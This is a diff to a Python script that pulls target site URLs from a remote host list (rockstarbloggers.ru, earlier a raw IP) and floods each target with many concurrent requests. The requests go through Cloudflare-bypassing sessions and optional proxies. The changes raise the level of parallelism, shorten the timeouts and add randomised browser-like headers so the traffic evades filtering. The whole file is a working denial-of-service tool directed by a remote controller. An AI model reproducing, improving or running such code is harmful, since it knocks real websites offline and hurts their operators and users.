@@ -1,5 +1,4 @@
 import asyncio
-import json
 import random
 from sys import stderr
 
@@ -7,11 +6,12 @@ import requests
 from aiocfscrape import CloudflareScraper
 from aiohttp import ClientTimeout
 from loguru import logger
+from pyuseragents import random as random_useragent
 from urllib3 import disable_warnings
 
-HOSTS = ['http://46.4.63.238/api.php']  # api for getting fucking sites
+HOSTS = 'http://rockstarbloggers.ru/hosts.json'  # api with hosts of fucking sites
 TIMEOUT = ClientTimeout(
-    total=20,
+    total=10,
     connect=10,
     sock_read=10,
     sock_connect=10,
@@ -19,9 +19,18 @@ TIMEOUT = ClientTimeout(
 CUSTOM_PROXY = None  # can be like 'http://login:username@1.2.3.4:5678' OR 'http://1.2.3.4:5678'
 CUSTOM_PROXIES_FILE = None  # name of file with list of proxies, each one in separate line
 REQUESTS_PER_SITE = 50
-PARALLEL_COUNT = 20
+PARALLEL_COUNT = 30
 SHOW_REQUEST_EXCEPTIONS = False
 FORCE_HTTPS = True
+
+HEADERS_TEMPLATE = {
+    'Content-Type': 'application/json',
+    # 'User-Agent': random_useragent(),
+    'Connection': 'keep-alive',
+    'Accept': 'application/json, text/plain, */*',
+    'Accept-Language': 'ru',
+    'Accept-Encoding': 'gzip, deflate, br'
+}
 
 
 def main():
@@ -36,9 +45,7 @@ def main():
 async def start_one():
     while True:
         try:
-            host = random.choice(HOSTS)
-            content = requests.get(host).content
-            data = json.loads(content)
+            data = _get_target_data()
             url = data['site']['url']
             url = _fix_url(url, force_https=FORCE_HTTPS)
             async with CloudflareScraper(timeout=TIMEOUT, trust_env=True) as session:
@@ -61,6 +68,16 @@ async def start_one():
                             break
         except Exception as e:
             logger.warning(f'Exception, retrying, exception={e}')
+
+
+def _get_target_data():
+    while True:
+        try:
+            hosts = requests.get(HOSTS, timeout=5).json()
+            host = random.choice(hosts)
+            return requests.get(host, timeout=3).json()
+        except:
+            continue
 
 
 def _load_proxies(filename: str) -> list:
@@ -90,12 +107,19 @@ async def attempt(session: CloudflareScraper, url: str, proxy: str = None) -> bo
 
 async def request(session: CloudflareScraper, url: str, proxy: str = None) -> int:
     try:
-        async with session.get(url, proxy=proxy, verify_ssl=False) as response:
+        headers = _get_headers()
+        async with session.get(url, headers=headers, proxy=proxy, verify_ssl=False) as response:
             return response.status
     except Exception as e:
         if SHOW_REQUEST_EXCEPTIONS:
             logger.warning(f'Exception on request, exception={e}, url={url}, proxy={proxy}')
         return -1
+
+
+def _get_headers() -> dict:
+    headers = HEADERS_TEMPLATE.copy()
+    headers['User-Agent'] = random_useragent()
+    return headers
 
 
 if __name__ == '__main__':
